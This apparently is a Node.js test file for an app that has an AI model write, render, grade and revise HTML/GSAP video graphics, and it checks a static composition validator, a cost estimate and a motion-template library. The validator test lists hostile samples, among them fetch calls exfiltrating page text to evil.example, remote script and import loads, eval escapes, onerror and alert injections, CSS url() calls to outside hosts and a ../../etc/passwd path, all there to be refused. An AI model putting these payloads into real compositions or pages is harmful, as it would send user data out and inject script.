// Custom graphics: the contract (static checks), hero moments on the owner's real run, the words-said check, the
// grade, the cost estimate, the saved look, and the write → render → grade → revise loop with a fake model and a
// fake sandbox (the real sandbox is in custom-graphics.e2e.cjs).
const test = require('node:test')
const assert = require('node:assert/strict')
const fs = require('node:fs')
const os = require('node:os')
const path = require('node:path')
const { loadMain } = require('../zernio/support/load-main.cjs')

const shared = loadMain("export * from './src/shared/custom-graphics'")
const RUN = JSON.parse(fs.readFileSync(path.join(__dirname, 'fixtures/custom-graphics-run.json'), 'utf8'))
const FAKE = path.join(__dirname, 'fake-custom-graphics')
const read = (name) => fs.readFileSync(path.join(FAKE, name), 'utf8')
const seconds = (html) => Number(/data-duration="([\d.]+)"/.exec(html)[1]) * 1000
const plain = (x) => JSON.parse(JSON.stringify(x))

test('our example and fake compositions follow the contract', () => {
  for (const e of shared.CUSTOM_EXAMPLES) assert.deepEqual(shared.checkComposition(e.html, { width: 1080, height: 800, durationMs: seconds(e.html) }), [], e.brief)
  for (const name of fs.readdirSync(FAKE).filter((f) => f.endsWith('.html'))) {
    const html = read(name)
    assert.deepEqual(shared.checkComposition(html, { width: 1080, height: 1267, durationMs: seconds(html) }), [], name)
  }
  // The writer's prompt carries the rules, the contract and the examples; it is the same for every moment (cacheable).
  const system = shared.writerSystemPrompt()
  assert.match(system, /DESIGN RULES/); assert.match(system, /COMPOSITION CONTRACT/); assert.match(system, /EXAMPLE 3/)
  assert.equal(system, shared.writerSystemPrompt())
  assert.ok(system.length < 16000)
})

test('the static check refuses what reaches out, loads, times itself, escapes or breaks the contract', () => {
  const good = shared.CUSTOM_EXAMPLES[1].html
  const expect = { width: 1080, height: 520, durationMs: 4000 }
  const inScript = (code) => good.replace('window.__timelines = [tl];', `${code}\nwindow.__timelines = [tl];`)
  const bad = {
    fetch: inScript("fetch('https://evil.example/x?d=' + document.body.innerText)"),
    xhr: inScript('new XMLHttpRequest()'),
    socket: inScript("new WebSocket('wss://evil.example')"),
    eval: inScript("eval('1')"),
    constructor: inScript("[].constructor.constructor('return 1')()"),
    escaped: inScript("window['\\u0066etch']('x')"),
    timer: inScript('setTimeout(() => 1, 5)'),
    clock: inScript('const t = Date.now()'),
    random: inScript('const r = Math.random()'),
    loop: inScript('while (true) {}'),
    open: inScript("window.open('https://evil.example')"),
    location: inScript("location.href = 'https://evil.example'"),
    storage: inScript("localStorage.setItem('a', 'b')"),
    importCall: inScript("import('https://evil.example/m.js')"),
    innerHTML: inScript("document.body.innerHTML = '<img src=x onerror=alert(1)>'"),
    makeScript: inScript("document.createElement('script')"),
    iframe: good.replace('<div class="panel">', '<iframe></iframe><div class="panel">'),
    image: good.replace('<div class="panel">', '<img alt=""><div class="panel">'),
    handler: good.replace('<div class="panel">', '<div class="panel" onclick="alert(1)">'),
    link: good.replace('<div class="panel">', '<a href="https://evil.example"><div class="panel">'),
    cssUrl: good.replace('#cg-root .no{', "#cg-root .no{background:url(https://evil.example/p.png);"),
    cssImport: good.replace('<style>', "<style>@import 'https://evil.example/a.css';"),
    cssAnimation: good.replace('#cg-root .no{', '#cg-root .no{transition:opacity 1s;'),
    unscoped: good.replace('<style>', '<style>body{background:red}'),
    rootSized: good.replace('<style>', '<style>#cg-root{width:2000px}'),
    twoScripts: good + '<script>window.__timelines = []</script>',
    scriptSrc: good.replace('<script>', '<script src="https://evil.example/x.js">'),
    comment: good.replace('<div class="panel">', '<!-- hi --><div class="panel">'),
    notPaused: good.replace('{ paused: true }', '{}'),
    noRegister: good.replace('window.__timelines = [tl];', ''),
    duration: good.replace('data-duration="4.00"', 'data-duration="9.00"'),
    endless: good.replace("duration: 0.45, ease: 'expo.out' }, 0)", "duration: 0.45, repeat: -1, ease: 'expo.out' }, 0)"),
    huge: good + ' '.repeat(shared.MAX_COMPOSITION_CHARS),
    document: '<html><body>' + good + '</body></html>'
  }
  for (const [name, html] of Object.entries(bad)) assert.ok(shared.checkComposition(html, expect).length > 0, `${name} is refused`)
  assert.match(shared.checkComposition(bad.fetch, expect).join(' '), /fetch/)
  assert.match(shared.checkComposition(bad.cssUrl, expect).join(' '), /url\(\)/)
  // A model's answer: the ```html block, or the composition after a line of chatter.
  assert.equal(shared.extractComposition('Sure!\n```html\n' + good + '\n```\nDone.'), good.trim())
  assert.ok(shared.extractComposition('Here it is: ' + good).startsWith('<div id="cg-root"'))
})

test('hero moments on the owner\'s run: the opening twist, the staircase, warm vs cold, organic vs ads and the $8,188 proof', () => {
  const candidates = RUN.graphics.map((g) => ({ ref: g.id, word: 0, atMs: g.at_ms, durationMs: g.duration_ms, template: g.template, fields: g.fields, size: g.size, placement: g.placement }))
  candidates.push({ ref: 'line:0', word: 0, atMs: 53, durationMs: 6550, template: 'line', fields: {} })
  assert.equal(shared.heroCount(RUN.duration_ms), 5)
  const heroes = plain(shared.pickHeroMoments(candidates, { durationMs: RUN.duration_ms }))
  const by = (template) => RUN.graphics.find((g) => g.template === template && heroes.some((h) => h.ref === g.id))
  assert.deepEqual(heroes.map((h) => h.kind), ['claim', 'process', 'comparison', 'comparison', 'proof'])
  assert.deepEqual(heroes.map((h) => h.frame), ['card', 'visual', 'stage', 'visual', 'stage'])
  // The warm vs cold audience line swap is a comparison too (it wins over the 3 million stat).
  assert.equal(RUN.graphics.find((g) => g.id === heroes[2].ref).fields.effect, 'line-swap')
  assert.equal(heroes[0].replaces, null); assert.equal(heroes[0].placement, 'bottom')
  assert.ok(by('staircase') && by('compare_marks'))
  assert.equal(RUN.graphics.find((g) => g.id === heroes[4].ref).fields.value, '$8,188')
  // Never a CTA, a screen recording or a name tag; never two within the spacing.
  assert.ok(!heroes.some((h) => ['link_cta', 'screen_frame', 'lower_third'].includes(RUN.graphics.find((g) => g.id === h.ref)?.template)))
  for (let i = 1; i < heroes.length; i++) assert.ok(heroes[i].atMs - heroes[i - 1].atMs >= 15000)
  // A YouTube video gets about one per 90 s (at least 3, at most 12); custom ones already made keep their slot.
  assert.equal(shared.heroCount(26 * 60000, 'youtube'), 12)
  const again = shared.pickHeroMoments([...candidates, { ref: 'g-made', word: 0, atMs: 36000, durationMs: 13000, template: 'custom', fields: {} }], { durationMs: RUN.duration_ms })
  assert.ok(again.some((h) => h.ref === 'g-made') && !again.some((h) => RUN.graphics.find((g) => g.id === h.ref)?.template === 'staircase'))
  // A proof on the stage lasts long enough to read; never into the next graphic.
  assert.equal(shared.heroDuration({ atMs: 196793, durationMs: 3000, frame: 'stage' }, 209687, RUN.duration_ms), 4500)
  assert.equal(shared.heroDuration({ atMs: 196793, durationMs: 3000, frame: 'stage' }, 199000, RUN.duration_ms), 1907)
})

test('words said: numbers as said (in words too), any form of a said word; anything else is caught', () => {
  const said = shared.saidIndex(RUN.words)
  assert.deepEqual(shared.unsaidOnScreen(['$8,188', 'generated', '$4,365 on ads', 'October 20th', 'a few people', 'organic content', 'step 2', 'three million'], said), [])
  assert.deepEqual(shared.unsaidOnScreen(['10 million', 'guaranteed', '7x faster'], said), ['10', 'guaranteed', '7', 'faster'])
  assert.deepEqual(shared.unsaidOnScreen(['$9,999'], said), ['9,999'])
})

test('the grade: JSON (fenced or not); a pass needs every check and 7+; unreadable fails', () => {
  assert.deepEqual(plain(shared.parseGrade('```json\n{"pass": true, "score": 8, "failed": [], "fixes": []}\n```')), { pass: true, score: 8, failed: [], fixes: [] })
  const fail = shared.parseGrade('{"pass": true, "score": 6, "failed": ["face", "made-up"], "fixes": ["Move the panel down 120 px."]}')
  assert.equal(fail.pass, false); assert.deepEqual(plain(fail.failed), ['face']); assert.deepEqual(plain(fail.fixes), ['Move the panel down 120 px.'])
  assert.equal(shared.parseGrade('looks great!').pass, false)
  assert.equal(shared.parseGrade('{"pass": true, "score": 9, "failed": ["clipped"]}').pass, false)
})

test('cost: about the target for a short video\'s moments, fewer revisions for an expensive model', () => {
  const e = shared.customGraphicsEstimate(4)
  assert.ok(e.expectedUsd > 0.2 && e.expectedUsd <= 0.75, `4 moments expected ${e.expectedUsd}`)
  assert.ok(e.mostUsd >= e.expectedUsd)
  assert.equal(e.revisions, 2)
  assert.ok(shared.customGraphicsEstimate(5).expectedUsd <= 0.8)
  const pricey = { input: 15e-6, output: 75e-6 }
  assert.ok(shared.revisionCap(5, pricey) < 2)
  assert.equal(shared.revisionCap(3, { input: 0.3e-6, output: 1.2e-6 }), 2)
  assert.equal(shared.callCost({ cost: 0.042 }), 0.042)
  assert.ok(Math.abs(shared.callCost({ prompt_tokens: 1000, completion_tokens: 100 }, { input: 1e-6, output: 2e-6 }) - 0.0012) < 1e-12)
})

test('geometry: the band per frame kind, the fit at bake, the still times', () => {
  const visual = plain(shared.customGeometry('visual', { hook: 0 }))
  assert.deepEqual(visual.root, { x: 0, y: 154, width: 1080, height: 1267 })
  const stage = plain(shared.customGeometry('stage', { hook: 0 }))
  assert.equal(stage.root.height, 806); assert.ok(stage.card.y > stage.root.y + stage.root.height)
  assert.deepEqual(plain(shared.fitRoot({ width: 1080, height: 1267 }, { x: 0, y: 154, width: 1080, height: 1267 })), { x: 0, y: 154, scale: 1 })
  assert.deepEqual(plain(shared.fitRoot({ width: 1080, height: 1267 }, { x: 0, y: 300, width: 1080, height: 1000 })), { x: 114, y: 300, scale: 0.7893 })
  const times = shared.stillTimes(13030, [700, 3900, 10430])
  assert.ok(times[0] < times[1] && times[1] < times[2] && times[2] < 13030 && times[1] > 10430)
})

test('a saved look keeps colors and our fonts only (its values go into the sandbox page\'s CSS)', () => {
  const look = shared.customLook({ kind: 'visual', brandColor: null, font: 'serif' })
  assert.equal(look.ground, '#1F4E9C'); assert.equal(look.ink, '#FFFFFF')
  assert.ok(shared.contrast(look.accent, look.ground) >= 2.2)
  assert.deepEqual(plain(shared.parseLook(look)), plain(look))
  assert.equal(shared.parseLook({ ...look, accent: 'red;} body{background:url(https://x)' }), null)
  assert.equal(shared.parseLook({ ...look, display: '"Comic Sans"' }), null)
  const card = shared.customLook({ kind: 'card', brandColor: '#FFD400', font: 'clean' })
  assert.equal(card.ground, 'video'); assert.ok(shared.contrast(card.accentInk, '#FFFFFF') >= 4.4)
})

function mainModule() {
  return loadMain("export * from './src/main/custom-graphics'", {
    electron: { app: { isPackaged: false, getPath: () => os.tmpdir() } }, './custom-render': { customSandbox: () => { throw new Error('use the fake') } },
    './settings-store': { loadSettings: () => ({ openrouterApiKey: '' }) }, './member-prefs': { readMemberPrefs: () => ({ create: {} }) }, './openrouter-models': { getModelCatalog: async () => ({ planning: [] }) },
    './logger': { logger: { info() {}, warn() {} } }
  })
}

function brief(name, kind, frame, durationMs) {
  const geometry = shared.customGeometry(frame, { hook: 0 })
  return { kind, frame, durationMs, geometry, look: shared.customLook({ kind: frame, font: 'serif' }), cues: [{ word: 'product', at: 0.9 }], before: '', after: '', planned: name }
}

test('the loop: a too-small first try is sent back with our fix, then kept; files named by the hash; costs counted', async () => {
  const m = mainModule()
  const run = fs.mkdtempSync(path.join(os.tmpdir(), 'custom-loop-'))
  const html = read('staircase.html')
  const calls = []
  const call = async (request) => {
    calls.push(request)
    if (request.purpose === 'grade') return { text: '{"pass": true, "score": 8, "failed": [], "fixes": []}', costUsd: 0.02 }
    return { text: '```html\n' + html + '\n```', costUsd: 0.08 }
  }
  let shots = 0
  const sandbox = { stills: async (req) => {
    shots++
    assert.equal(req.times.length, 3); assert.equal(req.scale, 0.5)
    return { transparent: [Buffer.from('a'), Buffer.from('b'), Buffer.from('c')], composite: Buffer.from('jpg'), texts: ['only three things', 'a product', 'an offer', 'attract', 'eyeballs'],
      problems: shots === 1 ? ['Some words are only about 28 px tall; make every label at least 44 px.'] : [] }
  } }
  const result = await m.produceCustomGraphic({ run, brief: brief('Staircase', 'process', 'visual', 13030), words: 'a product an offer attract eyeballs',
    said: shared.saidIndex(RUN.words), frame: null, fallback: { template: 'staircase', fields: { items: 'a\nb\nc' }, duration_ms: 13030, placement: 'middle' }, model: 'anthropic/claude-opus-5.5', maxRevisions: 2 },
  { call, sandbox })
  assert.equal(result.tries, 2)
  assert.ok(Math.abs(result.costUsd - 0.2) < 1e-9)
  const revision = calls.filter((c) => c.purpose === 'write')[1]
  assert.match(revision.user, /YOUR PREVIOUS COMPOSITION/); assert.match(revision.user, /at least 44 px/)
  // Our own check fails a graphic whatever the grade says, and the grader is told what we found.
  assert.match(calls.find((c) => c.purpose === 'grade').user, /Our automatic checks found: Some words are only about 28 px/)
  const comp = result.meta.comp
  assert.equal(comp, require('node:crypto').createHash('sha256').update(html.trim()).digest('hex').slice(0, 16))
  const found = m.readCustomGraphic(run, comp)
  assert.equal(found.html, html.trim()); assert.equal(found.meta.fallback.template, 'staircase'); assert.equal(found.meta.tries, 2)
  assert.deepEqual(m.customStillPaths(run, comp).map((p) => path.basename(p)), [`${comp}-0.png`, `${comp}-1.png`, `${comp}-2.png`])
  // A composition changed on disk no longer matches its name: it isn't drawn.
  fs.appendFileSync(path.join(run, '.graphics', 'custom', `${comp}.html`), '<script>fetch("x")</script>')
  assert.equal(m.readCustomGraphic(run, comp), null)
  assert.equal(m.readCustomGraphic(run, '../../etc/passwd'), null)
  fs.rmSync(run, { recursive: true, force: true })
})

test('the loop: unsaid words and refused code are fixed or dropped (the template stays); no grade when the model can\'t see', async () => {
  const m = mainModule()
  const run = fs.mkdtempSync(path.join(os.tmpdir(), 'custom-loop-'))
  const good = read('proof.html')
  const writes = []
  const call = async (request) => {
    if (request.purpose === 'grade') throw new Error('no grade expected')
    writes.push(request.user)
    return { text: writes.length === 1 ? good.replace('<script>', '<script>fetch("https://evil.example");') : good.replace(/\$8,188/g, '10 million'), costUsd: 0.05 }
  }
  const sandbox = { stills: async () => ({ transparent: [], composite: Buffer.from('x'), texts: ['10 million', 'on ads'], problems: [] }) }
  const result = await m.produceCustomGraphic({ run, brief: brief('Stat', 'proof', 'stage', 4500), words: 'eight thousand', said: shared.saidIndex(RUN.words), frame: null, fallback: null,
    model: 'z-ai/glm-5.3-flash', maxRevisions: 2, grade: false }, { call, sandbox })
  assert.equal(result.meta, null)
  assert.equal(result.tries, 3)
  assert.match(writes[1], /may not use fetch/)
  assert.match(result.reason, /not said/)
  assert.ok(!fs.existsSync(path.join(run, '.graphics', 'custom')))
  fs.rmSync(run, { recursive: true, force: true })
})

// ---------------------------------------------------------------------------
// My motion library
// ---------------------------------------------------------------------------

const lib = loadMain("export * from './src/shared/motion-library'")

test('library templates: every text becomes a slot, filling escapes words and sets the length, a fill must fit', () => {
  const html = read('staircase.html')
  const { template, slots } = lib.parameterize(html)
  assert.deepEqual(plain(slots.map((s) => s.sample)), ['only three things', 'a product', 'an offer', 'attract', 'eyeballs'])
  assert.ok(!template.includes('>a product<') && template.includes('>{{s2}}<'))
  // Style and script are left alone.
  assert.ok(template.includes("tl.from('#cg-root .title'"))
  const filled = lib.fillTemplate(template, { s1: 'two things', s2: 'a list', s3: 'an <offer>', s4: 'get', s5: 'buyers' }, 9000)
  assert.ok(filled.includes('an &lt;offer&gt;') && filled.includes('data-duration="9.00"'))
  assert.deepEqual(shared.checkComposition(filled, { width: 1080, height: 1267, durationMs: 9000 }), [])
  assert.throws(() => lib.fillTemplate(template, { s1: 'x' }, 9000), /Slot s2/)
  const fit = lib.parseFill('{"fits": true, "values": {"s1": "two things", "s2": "a list", "s3": "an offer", "s4": "get", "s5": "buyers"}}', slots)
  assert.equal(fit.fits, true)
  assert.equal(lib.parseFill('{"fits": true, "values": {"s1": "a much much much much longer line than before"}}', slots).fits, false)
  assert.equal(lib.parseFill('{"fits": false}', slots).fits, false)
  // Candidates: active, same kind and frame, about the same length, most used first.
  const item = (id, extra) => ({ id, kind: 'process', frame: 'visual', width: 1080, height: 1267, durationMs: 12000, tags: [], slots, idea: 'x', status: 'active', usedIn: ['r1'], createdAt: '2026-10-25', ...extra })
  const list = [item('a'.repeat(16), { usedIn: ['r1', 'r2'] }), item('b'.repeat(16), { status: 'retired' }), item('c'.repeat(16), { frame: 'stage' }), item('d'.repeat(16), { durationMs: 4000 }), item('e'.repeat(16))]
  assert.deepEqual(lib.libraryCandidates(list, 'process', 'visual', 13000).map((i) => i.id), ['a'.repeat(16), 'e'.repeat(16)])
})

test('the library in the loop: a passed graphic is kept, the next fitting moment fills it (no new design), a failure is retired', async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'motion-library-'))
  const electron = { app: { isPackaged: false, getPath: () => root } }
  const libMain = loadMain("export * from './src/main/motion-library'", { electron, './security': { authorizeMedia: (p) => p }, './logger': { logger: { info() {}, warn() {} } } })
  libMain.setLibraryRoot(path.join(root, 'motion-library'))
  const m = mainModule()
  const hooks = { match: libMain.libraryMatch, get: libMain.readLibraryTemplate, keep: libMain.keepInLibrary, used: libMain.noteLibraryUse }
  const html = read('staircase.html')
  const purposes = []
  const call = async (request) => {
    purposes.push(request.purpose)
    if (request.purpose === 'grade') return { text: '{"pass": true, "score": 8, "failed": [], "fixes": []}', costUsd: 0.02 }
    if (request.purpose === 'fill') return { text: '{"fits": true, "values": {"s1": "only three things", "s2": "a product", "s3": "an offer", "s4": "attract", "s5": "eyeballs"}}', costUsd: 0.004 }
    return { text: '```html\n' + html + '\n```', costUsd: 0.08 }
  }
  const sandbox = { stills: async () => ({ transparent: [Buffer.from('p0'), Buffer.from('p1'), Buffer.from('p2')], composite: Buffer.from('j'), texts: ['only three things', 'a product'], problems: [] }) }
  const input = (run) => ({ run, brief: brief('Staircase', 'process', 'visual', 13030), words: 'a product an offer attract eyeballs', said: shared.saidIndex(RUN.words), frame: null, fallback: null, model: 'm/x', maxRevisions: 2 })
  const runA = path.join(root, 'edit-a'), runB = path.join(root, 'edit-b')
  fs.mkdirSync(runA); fs.mkdirSync(runB)
  const first = await m.produceCustomGraphic(input(runA), { call, sandbox, library: hooks })
  assert.ok(first.meta && !first.library)
  assert.deepEqual(purposes, ['write', 'grade'])
  const view = libMain.libraryView()
  assert.equal(view.length, 1); assert.equal(view[0].status, 'active'); assert.equal(view[0].uses, 1); assert.equal(view[0].stills.length, 3)
  // The next video: the same kind of moment is filled from the library (a small call), not designed again.
  purposes.length = 0
  const second = await m.produceCustomGraphic(input(runB), { call, sandbox, library: hooks })
  assert.equal(second.library, view[0].id)
  assert.deepEqual(purposes, ['fill', 'grade'])
  assert.ok(second.costUsd < 0.03)
  assert.equal(libMain.libraryView()[0].uses, 2)
  // A note asks for a change: designed again, not filled.
  purposes.length = 0
  await m.produceCustomGraphic({ ...input(runB), brief: { ...brief('Staircase', 'process', 'visual', 13030), note: 'use a ladder' } }, { call, sandbox, library: hooks })
  assert.equal(purposes[0], 'write')
  // Retire it: not offered any more; restore brings it back.
  libMain.setLibraryStatus(view[0].id, 'retired')
  assert.equal(libMain.libraryMatch('process', 'visual', 13030), null)
  libMain.setLibraryStatus(view[0].id, 'active')
  assert.ok(libMain.libraryMatch('process', 'visual', 13030))
  // One that never passes is kept as Retired, with the reason.
  const failing = async (request) => request.purpose === 'grade' ? { text: '{"pass": false, "score": 4, "failed": ["design"], "fixes": ["Too busy."]}', costUsd: 0.02 }
    : { text: '```html\n' + read('proof.html') + '\n```', costUsd: 0.08 }
  const failed = await m.produceCustomGraphic({ ...input(runB), brief: brief('Stat', 'proof', 'stage', 4500), maxRevisions: 1 }, { call: failing, sandbox, library: hooks })
  assert.equal(failed.meta, null)
  const retired = libMain.libraryView().find((i) => i.status === 'retired')
  assert.ok(retired && /Too busy/.test(retired.reason))
  fs.rmSync(root, { recursive: true, force: true })
})
